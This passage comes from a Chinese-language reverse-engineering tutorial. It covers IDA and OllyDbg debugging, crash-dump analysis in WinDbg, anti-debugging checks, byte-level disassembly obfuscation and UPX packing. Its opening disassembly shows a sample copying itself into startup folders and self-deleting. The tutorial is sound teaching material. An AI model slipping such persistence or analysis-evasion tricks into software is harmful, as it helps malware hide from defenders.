<p><img class="alignnone size-full wp-image-99847 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488945439284.png" alt=".1488945439284" width="1446" height="545" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488945439284.png 1446w, http://www.mottoin.com/wp-content/uploads/2017/04/1488945439284-300x113.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488945439284-768x289.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1488945439284-1024x386.png 1024w" sizes="(max-width: 1446px) 100vw, 1446px" /><span class="md-line md-end-block">双击函数名，跳转到该函数的开头。<br />
在Export类型的函数上，双击并设置断点。<br />
</span><span class="md-line md-end-block">按F9运行样本文件，程序会在断点处暂停运行。<br />
</span><span class="md-line md-end-block">按Ctrl+F9(运行至Return处)或者按Alt+F9(运行到用户代码处)，程序会继续运行到函数返回的地方。</span></p>
<p><img class="alignnone size-full wp-image-99848 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488947599525.png" alt=".1488947599525" width="955" height="463" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488947599525.png 955w, http://www.mottoin.com/wp-content/uploads/2017/04/1488947599525-300x145.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488947599525-768x372.png 768w" sizes="(max-width: 955px) 100vw, 955px" /></p>
<pre>text:004013C2 push 400h ; nSize
.text:004013C7 lea eax, [esp+85Ch+Filename]
.text:004013CE push eax ; lpFilename
.text:004013CF push ecx ; hModule
.text:004013D0 call ds:GetModuleFileNameA
.text:004013D6 mov esi, ds:SHGetSpecialFolderPathA
.text:004013DC push 0 ; fCreate
.text:004013DE push 7 ; csidl
.text:004013E0 lea ecx, [esp+860h+pszPath]
.text:004013E4 push ecx ; pszPath
.text:004013E5 push 0 ; hwnd
.text:004013E7 call esi ; SHGetSpecialFolderPathA
.text:004013E9 mov edi, ds:lstrcatA
.text:004013EF push offset String2 ; "\\0.exe"
.text:004013F4 lea edx, [esp+85Ch+pszPath]
.text:004013F8 push edx ; lpString1
.text:004013F9 call edi ; lstrcatA
.text:004013FB mov ebx, ds:CopyFileA
.text:00401401 push 0 ; bFailIfExists
.text:00401403 lea eax, [esp+85Ch+pszPath]
.text:00401407 push eax ; lpNewFileName
.text:00401408 lea ecx, [esp+860h+Filename]
.text:0040140F push ecx ; lpExistingFileName
.text:00401410 call ebx ; CopyFileA
.text:00401412 push 0 ; fCreate
.text:00401414 push 5 ; csidl
.text:00401416 lea edx, [esp+860h+pszPath]
.text:0040141A push edx ; pszPath
.text:0040141B push 0 ; hwnd
.text:0040141D call esi ; SHGetSpecialFolderPathA
.text:0040141F push offset a1_exe ; "\\1.exe"
.text:00401424 lea eax, [esp+85Ch+pszPath]
.text:00401428 push eax ; lpString1
.text:00401429 call edi ; lstrcatA
.text:0040142B push 0 ; bFailIfExists
.text:0040142D lea ecx, [esp+85Ch+pszPath]
.text:00401431 push ecx ; lpNewFileName
.text:00401432 lea edx, [esp+860h+Filename]
.text:00401439 push edx ; lpExistingFileName
.text:0040143A call ebx ; CopyFileA
.text:0040143C lea eax, [esp+858h+pszPath]
.text:00401440 lea edx, [eax+1]
.text:00401443
.text:00401443 loc_401443: ; CODE XREF: sub_401380+C8j
.text:00401443 mov cl, [eax]
.text:00401445 inc eax
.text:00401446 test cl, cl
.text:00401448 jnz short loc_401443
.text:0040144A sub eax, edx
.text:0040144C push eax ; cbData
.text:0040144D lea eax, [esp+85Ch+pszPath]
.text:00401451 push eax ; lpData
.text:00401452 call sub_401310
.text:00401457 add esp, 8
.text:0040145A call sub_401220
.text:0040145F push 0 ; nExitCode
.text:00401461 call ds:PostQuitMessage
.text:00401467 jmp loc_40151F</pre>
<p><span class="md-line md-end-block">IDA会显示出调用的函数名和参数。<span spellcheck="false"><code>00401452</code></span>处的<span spellcheck="false"><code>SetRegValue</code></span>函数以及<span spellcheck="false"><code>0040145A</code></span>处的SelfDelete函数，它们分别用来注册表值以及自身删除。</span></p>
<p><span class="md-line md-end-block">在notepad++中编写汇编代码（扩展名为asm），使用<span class=""><a spellcheck="false" href="http://nasm.us">NASM汇编器</a></span>编译成obj文件，再用<span class=""><a spellcheck="false" href="http://alink.sourceforge.net/download.html">ALINK</a></span>编译成exe文件。</span></p>
<pre>extern MessageBoxA

section .text
global main

main:
 push dword 0
 push dword title
 push dword text
 push dword 0
 call MessageBoxA
 ret
 
section .data
title: db 'MessageBox',0
text: db 'Hello World!',0

</pre>
<p><img class="alignnone size-full wp-image-99849 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488957716297.png" alt=".1488957716297" width="826" height="544" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488957716297.png 826w, http://www.mottoin.com/wp-content/uploads/2017/04/1488957716297-300x198.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488957716297-768x506.png 768w" sizes="(max-width: 826px) 100vw, 826px" /></p>
<p><span class="md-line md-end-block">函数调用的过程如下：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">要显示的消息：Hello，World！</span></li>
<li><span class="md-line md-end-block">要显示的消息框标题：MessageBox</span></li>
<li><span class="md-line md-end-block">将参数按照从后往前的顺序入栈</span></li>
<li><span class="md-line md-end-block">用call MessageBoxA调用函数</span></li>
</ul>
<p><span class="md-line md-end-block">该exe程序在OD的显示情况：</span></p>
<p><img class="alignnone size-full wp-image-99850 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488958231316.png" alt=".1488958231316" width="1905" height="782" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488958231316.png 1905w, http://www.mottoin.com/wp-content/uploads/2017/04/1488958231316-300x123.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488958231316-768x315.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1488958231316-1024x420.png 1024w" sizes="(max-width: 1905px) 100vw, 1905px" /></p>
<h2 class="md-end-block md-heading">内存转储和反调试</h2>
<h3 class="md-end-block md-heading">内存转储</h3>
<h4 class="md-end-block md-heading">获取内存转储</h4>
<p><span class="md-line md-end-block">随着程序的运行，内存中的数据会不断实时变化，如果保存某个时间点的状态(快照)，就需要内存转储。</span><span class="md-line md-end-block">内存转储是用于系统崩溃时，将内存中的数据转储保存在转储文件中，供给有关人员进行排错分析用途。而它所保存生成的文件就叫做内存转储文件。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>1. 在windows vista以上版本生成内存转储:</strong></span></span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">打开任务管理器</span></li>
<li><span class="md-line md-end-block">右键点击目标进程名称</span></li>
<li><span class="md-line md-end-block">选择“创建转储文件”</span></li>
</ul>
<p><img class="alignnone size-full wp-image-99851 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488961482669.png" alt=".1488961482669" width="653" height="688" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488961482669.png 653w, http://www.mottoin.com/wp-content/uploads/2017/04/1488961482669-285x300.png 285w" sizes="(max-width: 653px) 100vw, 653px" /></p>
<p><img class="alignnone size-full wp-image-99852 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488961552492.png" alt=".1488961552492" width="498" height="233" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488961552492.png 498w, http://www.mottoin.com/wp-content/uploads/2017/04/1488961552492-300x140.png 300w" sizes="(max-width: 498px) 100vw, 498px" /></p>
<blockquote><p><span class="md-line md-end-block">尽管操作系统会按照可执行文件中的内容将程序加载到内存中，但内存中的数据与可执行文件中的数据并不安全相同</span></p></blockquote>
<p><span class="md-line md-end-block"><span class=""><strong>2.在windows xp及以下的版本系统生成内存转储</strong></span></span></p>
<p><span class="md-line md-end-block">在运行中输入Drwatson，或者是在附件-&gt;系统工具-&gt;系统信息中打开Drwatson，生成内存转储文件和日志。</span></p>
<p><img class="alignnone size-full wp-image-99853 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488964523913.png" alt=".1488964523913" width="853" height="980" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488964523913.png 853w, http://www.mottoin.com/wp-content/uploads/2017/04/1488964523913-261x300.png 261w, http://www.mottoin.com/wp-content/uploads/2017/04/1488964523913-768x882.png 768w" sizes="(max-width: 853px) 100vw, 853px" /></p>
<p><span class="md-line md-end-block">日志记载了崩溃的应用程序名称、崩溃发生时间、用户名、操作系统版本以及其他正在运行的进程列表等全局信息。从错误的代码可以看出是，对内存非法访问。</span></p>
<p><span class="md-line md-end-block">接下来的模块清单中，记载了崩溃时，进程所加载的模块，从中可以确认每个模块各自映射的内存地址。</span></p>
<pre style="padding-left: 90px;">错误 -&gt;004012bf 668911 mov [ecx],dx ds:0023:00000000=????
 004012c2 8b4d08 mov ecx,[ebp+0x8]
 004012c5 50 push eax
 004012c6 51 push ecx
 004012c7 ff15a8204000 call dword ptr [guitest+0x20a8 (004020a8)]
 004012cd b801000000 mov eax,0x1
 004012d2 5d pop ebp
 004012d3 c21000 ret 0x10
 004012d6 3b0d00304000 cmp ecx,[guitest+0x3000 (00403000)]
 004012dc 7502 jnz guitest+0x12e0 (004012e0)
 004012de f3c3 rep ret</pre>
<blockquote><p><span class="md-line md-end-block">在地址<span spellcheck="false"><code>004012bf</code></span>的mov指令旁边写着一个“错误字样”，mov[ecx],dx 这条指令的功能是将dx的值写入ecx所代表的内存地址中。查看寄存器，发现ecx的值为00000000，将数据写入00000000的地址会引起崩溃。</span></p></blockquote>
<h3 class="md-end-block md-heading">有效运行实时调试</h3>
<p><span class="md-line md-end-block">在OllyDbg的菜单中点击Options-&gt;Just-in-time debugging，会弹出一个设置对话框。点击“Make OllyDbg just-in-time debugger”按钮，OllyDbg就会将自己的信息配置到上述注册表项目中。<br />
</span></p>
<p><img class="alignnone size-full wp-image-99854 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488981072395.png" alt=".1488981072395" width="1003" height="610" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488981072395.png 1003w, http://www.mottoin.com/wp-content/uploads/2017/04/1488981072395-300x182.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488981072395-768x467.png 768w" sizes="(max-width: 1003px) 100vw, 1003px" /></p>
<p><span class="md-line md-end-block">将OD设置为实时调试器之后，再一次运行该会崩溃的程序。这次程序崩溃后，OD会自动打开，挂载到崩溃的进程上。（<span class=""><strong>管理员运行会崩溃的程序，OD才会自动被打开</strong></span>）</span></p>
<p><span class="md-line md-end-block">实时调试对于处理一些难以重新的Bug非常有效。</span></p>
<h3 class="md-end-block md-heading">通过转储文件寻找出错原因</h3>
<p><span class="md-line md-end-block">当程序崩溃时，最好能够在第一时间启动调试器，但有些情况无法做到这一点。这时候，只要留下转储文件，也能通过它找到出错的原因。</span></p>
<p><span class="md-line md-end-block">转储文件可以使用WinDbg来分析。</span></p>
<p><span class="md-line md-end-block">打开WinDbg，然后按Ctrl+D或者点击菜单中的File-&gt;Open Crash Dump，打开转储文件。</span></p>
<p><img class="alignnone size-full wp-image-99855 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488982085948.png" alt=".1488982085948" width="996" height="785" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488982085948.png 996w, http://www.mottoin.com/wp-content/uploads/2017/04/1488982085948-300x236.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488982085948-768x605.png 768w" sizes="(max-width: 996px) 100vw, 996px" /></p>
<p><span class="md-line md-end-block">WinDbg虽然有图形界面，但实际上却更像是一个命令行工具，因为它基本上是通过命令交互来进行调试。因此，和OD相比，WinDbg更难上手，但有些情况只能用WinDbg。例如，64位程序以及运行在内核领域的程序。</span></p>
<p><span class="md-line md-end-block">第一次启动只有一个command窗口，从view菜单可以显示更多的窗口。</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block"><span class=""><strong>Alt+6:显示Call Stack(调用栈)窗口</strong></span></span></li>
<li><span class="md-line md-end-block"><span class=""><strong>Alt+7:显示Disassembly(反汇编)窗口</strong></span></span></li>
</ul>
<p><span class="md-line md-end-block">调用栈：</span></p>
<p><img class="alignnone size-full wp-image-99857 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488982549799.png" alt=".1488982549799" width="973" height="522" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488982549799.png 973w, http://www.mottoin.com/wp-content/uploads/2017/04/1488982549799-300x161.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488982549799-768x412.png 768w" sizes="(max-width: 973px) 100vw, 973px" /></p>
<p><span class="md-line md-end-block"><span class="md-image md-img-error" contenteditable="false" data-src="./1488982549799.png"><span class="md-meta md-before md-content" contenteditable="true">反汇编窗口：</span></span></span></p>
<p><span class="md-line md-end-block"><img class="alignnone size-full wp-image-99856 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488982573470.png" alt=".1488982573470" width="992" height="804" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488982573470.png 992w, http://www.mottoin.com/wp-content/uploads/2017/04/1488982573470-300x243.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488982573470-768x622.png 768w" sizes="(max-width: 992px) 100vw, 992px" /></span></p>
<p><span class="md-line md-end-block">这里本来应该显示反汇编之后的代码，但由于EIP值为00000000,因此此处是一对问号，这就表示“出于某些原因，程序跳转到<span spellcheck="false"><code>00000000</code></span>这个值”</span></p>
<p><span class="md-line md-end-block">追溯一下函数调用的过程。从Call Stack窗口中可以看到：</span></p>
<pre>003044c 00000111 00000001 guitest2+0x12d00</pre>
<p><span class="md-line md-end-block">双击这一行，再看下Disassembly窗口，这时候会显示处<span spellcheck="false"><code>guitest2+0x12d0</code></span>地址的内容。</span></p>
<p><img class="alignnone size-full wp-image-99858 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1488985307660.png" alt=".1488985307660" width="813" height="581" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1488985307660.png 813w, http://www.mottoin.com/wp-content/uploads/2017/04/1488985307660-300x214.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1488985307660-768x549.png 768w" sizes="(max-width: 813px) 100vw, 813px" /></p>
<p><span class="md-line md-end-block">当前显示的地址是<span spellcheck="false"><code>004012d0</code></span>，我们看一下前一条指令<span spellcheck="false"><code>call eax</code></span>，按Alt+4可以查看寄存器的值。</span></p>
<p><img class="alignnone size-full wp-image-99859 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489025129943.png" alt=".1489025129943" width="1621" height="663" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489025129943.png 1621w, http://www.mottoin.com/wp-content/uploads/2017/04/1489025129943-300x123.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489025129943-768x314.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489025129943-1024x419.png 1024w" sizes="(max-width: 1621px) 100vw, 1621px" /></p>
<p><span class="md-line md-end-block">eax寄存器的值是<span spellcheck="false"><code>00000000</code></span>,也就是说，<span spellcheck="false"><code>004012ce</code></span>的这条call eax指令调用了00000000这个地址，这个就是引起崩溃的原因。</span></p>
<p><span class="md-line md-end-block">地址<span spellcheck="false"><code>004012c8</code></span>处也执行了一条call指令，由于返回值会存放在<span spellcheck="false"><code>eax</code></span>中，因此可以推测，eax的00000000是从这来的。</span><span class="md-line md-end-block">按<span spellcheck="false"><code>Alt+5</code></span>打开Memory(内存窗口)，在显示Virtual的地方输入<span spellcheck="false"><code>00402004</code></span></span></p>
<p><span class="md-line md-end-block">在显示Virtual的地方输入“00402004”</span></p>
<p><span class="md-line md-end-block">地址00402004的值为04240000(=00002404)</span></p>
<p><span class="md-line md-end-block">这里显示的的值是相对于基地址的偏移量，因此再输入<span spellcheck="false"><code>00400000+2404</code></span>，这时会显示出调用的函数名称，即<span spellcheck="false"><code>GetProcAddress</code></span>.</span></p>
<p><img class="alignnone size-full wp-image-99860 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489025726105.png" alt=".1489025726105" width="1497" height="651" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489025726105.png 1497w, http://www.mottoin.com/wp-content/uploads/2017/04/1489025726105-300x130.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489025726105-768x334.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489025726105-1024x445.png 1024w" sizes="(max-width: 1497px) 100vw, 1497px" /></p>
<p><span class="md-line md-end-block">相同的，地址004012bc所call的函数是LoadLibraryW</span></p>
<p><img class="alignnone size-full wp-image-99861 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489027563784.png" alt=".1489027563784" width="1701" height="279" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489027563784.png 1701w, http://www.mottoin.com/wp-content/uploads/2017/04/1489027563784-300x49.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489027563784-768x126.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489027563784-1024x168.png 1024w" sizes="(max-width: 1701px) 100vw, 1701px" /></p>
<p><span class="md-line md-end-block">将内存窗口确认下调用这些函数所传递的参数，将汇编代码改成更易懂 的形式。</span></p>
<pre>004012b7 6844214000 push "kernel31.dll"
004012bc ff1500204000 call LoadLibraryW
004012c2 6860214000 push "GetCurrentProcessID"
004012c7 50 push eax
004012c8 ff1504204000 call GetProcAddress
004012ce ffd0 call eax
004012d0 8b4d08 mov ecx,dword ptr [ebp+8]
004012d3 0fb7c6 movzx eax,si</pre>
<div class="CodeMirror cm-s-inner CodeMirror-wrap"></div>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>LoadLibraryW</code></span>函数的参数为kernel31.dll，但实际上系统中没有 kernel31.dll这个DLL文件，因此LoadLibraryW函数会调用失败。到这里程序还没有崩溃，但后面的GetProcAddress函数也会调用失败。随后，失败的GetProcAddress函数返回了00000000，于是<span spellcheck="false"><code>call eax</code></span>时进程就异常终止。</span></p>
<p><span class="md-line md-end-block">通过分析转储文件，可以找到一些导致意外错误的原因并进行修改。</span></p>
<blockquote><p><span class="md-line md-end-block">Windows、Linux、Mac OSX等一般的主流操作系统中都具备内存转储和调试等帮助软件分析的功能。利用此功能可以实现其他的一些好的或坏的目的。</span></p></blockquote>
<blockquote><p><span class="md-line md-end-block">JAVA具有跨平台性，采用了两种技术。在编译时，源码会被编译成字节。各种环境分别安装能够解释和执行字节码的虚拟机。对Java编写的程序进行分析，实际上是就相当于对Java的字节码进行分析。有一些工具能够将字节码还原成源码，这些工具称为反编译工具。相比x86汇编语言，Java字节码更容易还原成源码。</span></p></blockquote>
<h3 class="md-end-block md-heading">防止软件被人分析</h3>
<h4 class="md-end-block md-heading">反调试技术</h4>
<h5 class="md-end-block md-heading">IsDebuggerPresent</h5>
<p><span class="md-line md-end-block">IsDebuggerPresent是一种能够检测是否挂载了调试器的API函数，通过返回值是否为0可以判断调试器的挂载状态。</span></p>
<pre>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

int main(){
 if(IsDebuggerPresent()){
 //在调试器运行
 printf("on debugger\n");
 }else{
 //在调试器不运行
 printf("not on debugger\n")
 }
 getchar();
 return 0;
}</pre>
<blockquote><p><span class="md-line md-end-block">若希望在开发时方便调试，又要在发布之后防止破解，这一函数非常有用。在开发时，用ifdef或者注释来暂时禁用IsDebuggerPresent的调用，在发布版本再启用，再检测到调试器时改变程序逻辑。</span></p></blockquote>
<p><span class="md-line md-end-block">除外还有其他类似的API函数，如<span spellcheck="false"><code>CheckRemoteDebuggerPresent</code></span></span></p>
<pre>BOOL WINAPI CheckRemoteDebuggerPresent(
 _In_ HANDLE hProcess,
 _Inout_ PBOOL pbDebuggerPresent
);</pre>
<p><span class="md-line md-end-block">除了API函数，还有很多技术可以用于检测调试器。比如<span spellcheck="false"><code>anti-debug popf</code></span>和&#8221;anti-debug int2d&#8221;。</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">利用popf和SINGLE_STEP异常来检测调试器的方法。当返回值为0时为正常，为1则表示挂载了调试器。</span></li>
<li><span class="md-line md-end-block">利用<span spellcheck="false"><code>int 2dh</code></span>，当返回值为0是正常，为1表示挂载了调试器。</span></li>
</ul>
<h5 class="md-end-block md-heading">通过代码混淆防止分析</h5>
<p><span class="md-line md-end-block">若用了反汇编器进行静态分析，找到检测调试器逻辑(例如调用IsDebuggerPresent地方)，就可以轻易破解反调试器技术。用调试器从头开始追踪，也能找到检测调试器的逻辑。</span></p>
<p><span class="md-line md-end-block">例如：</span></p>
<p><span class="md-line md-end-block">调用IsDebuggerPresent的部分，其机器语言代码为<span spellcheck="false"><code>FF 15 00 20 40 00 85 C0 74 17</code></span>(截至到jz指令)</span></p>
<pre>00401000 main proc near
00401000 FF 15 00 20 40 00 call ds:__imp__IsDebuggerPresent@0
00401006 85 C0 test eax,eax
00401008 74 17 jz short loc_401021</pre>
<p><span class="md-line md-end-block">在此，若再前面增加一个EB，即变成<span spellcheck="false"><code>EB FF 15 00 20 40 00 85 C0 74 17</code></span>,在IDA显示的代码就会变成：</span></p>
<pre>FF 15 00 20 40 00 85 C0 74 17</pre>
<p><span class="md-line md-end-block">此处的指令变成了jmp、adc、test、jz，而call指令消失了，然而这段机器语言的实际功能却没有发生变化，因为EB FF相当于向前跳转1个字节，也就是跳转到00401001。</span><span class="md-line md-end-block">而00401001后面的机器语言代码为FF 15 00 20 40 00 85 C0 74 17，这段代码反汇编之后得到的指令是call、test、jz，因此call依然能够正常执行。</span></p>
<p><span class="md-line md-end-block">这里的关键点就是00401001处的FF，它可以当作前面jmp指令的一部分，也可以当作后面call指令的一部分。而IDA会从前往后按顺序进行反汇编，因此显示出的代码可能会和实际执行的代码不同。</span></p>
<blockquote><p><span class="md-line md-end-block">可阅读代码混淆的优秀论文。比如[Obfuscation of Executable Code to Improve Resistance to</span><span class="md-line md-end-block">Static Disassembly ](<span spellcheck="false"><a href="https://www2.cs.arizona.edu/solar/papers/CCS2003.pdf">https://www2.cs.arizona.edu/solar/papers/CCS2003.pdf</a></span>)和<span class=""><a spellcheck="false" href="https://www2.cs.arizona.edu/solar/papers/obf-signal.pdf">Binary Obfuscation Using Signals</a></span></span></p></blockquote>
<h5 class="md-end-block md-heading">将可执行文件压缩</h5>
<p><span class="md-line md-end-block">除了反调试和混淆，用打包器将可执行文件压缩防止软件分析，压缩之后依然可以运行。</span></p>
<p><span class="md-line md-end-block">打包器最有名的是叫做<span class=""><a spellcheck="false" href="https://github.com/upx/upx">UPX</a></span>的，支持EIF、DLL、COFF等多种可执行文件格式。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>打包器的原理非常简单，就是将原本可执行文件中的代码和数据进行压缩，然后将解压缩的代码放在前面，运行的时候先将原本的可执行数据解压缩出来，然后再运行解压缩后的数据。</strong></span></span></p>
<p><span class="md-line md-end-block">也有一些打包器的目的不是压缩，而是反调试(防止逆向工程)。比如<span class=""><a spellcheck="false" href="http://www.aspack.com/">ASPack</a></span>.</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>剖析例子：</strong></span></span><span class="md-line md-end-block">源码如下：</span></p>
<pre>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char *argv[])
{
 if(argc &lt; 2){
 fprintf(stderr, "$packed.exe &lt;password&gt;\n");
 return 1;
 }
 if(IsDebuggerPresent()){
 // 在调试器上运行
 printf("on debugger\n");
 return -1;
 }else{
 // 不在调试器上运行
 if(strcmp(argv[1], "unpacking") == 0){
 printf("correct!\n");
 }else{
 printf("auth error\n");
 return -1;
 }
 }
 getchar();
 return 0;
}</pre>
<blockquote><p><span class="md-line md-end-block">该程序简单，首先它会调用<span spellcheck="false"><code>IsDebuggerPresent</code></span>检测调试器是否存在。然后向程序传参数为“unpacking”这个字符串，则显示correct，否则auth error。</span></p></blockquote>
<p><span class="md-line md-end-block">编译源码后，使用IDA看：</span></p>
<pre>.text:00401000 _main proc near ; CODE XREF: ___tmainCRTStartup+11Dp
.text:00401000
.text:00401000 argc = dword ptr 8
.text:00401000 argv = dword ptr 0Ch
.text:00401000 envp = dword ptr 10h
.text:00401000
.text:00401000 push ebp
.text:00401001 mov ebp, esp
.text:00401003 cmp [ebp+argc], 2
.text:00401007 jge short loc_401028
.text:00401009 push offset Format ; "$packed.exe &lt;password&gt;\n"
.text:0040100E call ds:__iob_func
.text:00401014 add eax, 40h
.text:00401017 push eax ; File
.text:00401018 call ds:fprintf
.text:0040101E add esp, 8
.text:00401021 mov eax, 1
.text:00401026 pop ebp
.text:00401027 retn
.text:00401028 ; ---------------------------------------------------------------------------
.text:00401028
.text:00401028 loc_401028: ; CODE XREF: _main+7j
.text:00401028 call ds:IsDebuggerPresent
.text:0040102E test eax, eax
.text:00401030 jz short loc_401045
.text:00401032 push offset aOnDebugger ; "on debugger\n"
.text:00401037 call ds:printf
.text:0040103D add esp, 4
.text:00401040 or eax, 0FFFFFFFFh
.text:00401043 pop ebp
.text:00401044 retn
.text:00401045 ; ---------------------------------------------------------------------------
.text:00401045
.text:00401045 loc_401045: ; CODE XREF: _main+30j
.text:00401045 mov eax, [ebp+argv]
.text:00401048 mov eax, [eax+4]
.text:0040104B mov ecx, offset aUnpacking ; "unpacking"
.text:00401050
.text:00401050 loc_401050: ; CODE XREF: _main+6Aj
.text:00401050 mov dl, [eax]
.text:00401052 cmp dl, [ecx]
.text:00401054 jnz short loc_401070
.text:00401056 test dl, dl
.text:00401058 jz short loc_40106C
.text:0040105A mov dl, [eax+1]
.text:0040105D cmp dl, [ecx+1]
.text:00401060 jnz short loc_401070
.text:00401062 add eax, 2
.text:00401065 add ecx, 2
.text:00401068 test dl, dl
.text:0040106A jnz short loc_401050
.text:0040106C
.text:0040106C loc_40106C: ; CODE XREF: _main+58j
.text:0040106C xor eax, eax
.text:0040106E jmp short loc_401075
.text:00401070 ; ---------------------------------------------------------------------------
.text:00401070
.text:00401070 loc_401070: ; CODE XREF: _main+54j
.text:00401070 ; _main+60j
.text:00401070 sbb eax, eax
.text:00401072 sbb eax, 0FFFFFFFFh
.text:00401075
.text:00401075 loc_401075: ; CODE XREF: _main+6Ej
.text:00401075 test eax, eax
.text:00401077 jnz short loc_401091
.text:00401079 push offset aCorrect ; "correct!\n"
.text:0040107E call ds:printf
.text:00401084 add esp, 4
.text:00401087 call ds:getchar
.text:0040108D xor eax, eax
.text:0040108F pop ebp
.text:00401090 retn
.text:00401091 ; ---------------------------------------------------------------------------
.text:00401091
.text:00401091 loc_401091: ; CODE XREF: _main+77j
.text:00401091 push offset aAuthError ; "auth error\n"
.text:00401096 call ds:printf
.text:0040109C add esp, 4
.text:0040109F or eax, 0FFFFFFFFh
.text:004010A2 pop ebp
.text:004010A3 retn</pre>
<p><span class="md-line md-end-block">直接编译之后，静态分析，无论是程序逻辑和流程，还是用于对比参数的字符串，以及输出的内容，都原原本本地展现了出来。</span></p>
<p><span class="md-line md-end-block">接下来用，UPX打包一下：</span></p>
<p><img class="alignnone size-full wp-image-99862 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489043494211.png" alt=".1489043494211" width="836" height="267" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489043494211.png 836w, http://www.mottoin.com/wp-content/uploads/2017/04/1489043494211-300x96.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489043494211-768x245.png 768w" sizes="(max-width: 836px) 100vw, 836px" /></p>
<p><span class="md-line md-end-block">IDA Pro分析：</span></p>
<p><img class="alignnone size-full wp-image-99863 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489046354996.png" alt=".1489046354996" width="326" height="491" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489046354996.png 326w, http://www.mottoin.com/wp-content/uploads/2017/04/1489046354996-199x300.png 199w" sizes="(max-width: 326px) 100vw, 326px" /></p>
<p><span class="md-line md-end-block">程序变得复杂。用二进制编辑器打开可执行文件，我们也无法找到correct!、author error等字符串。这也就是打包器能够防止逆向地原因。</span></p>
<h5 class="md-end-block md-heading">将压缩过的文件解包</h5>
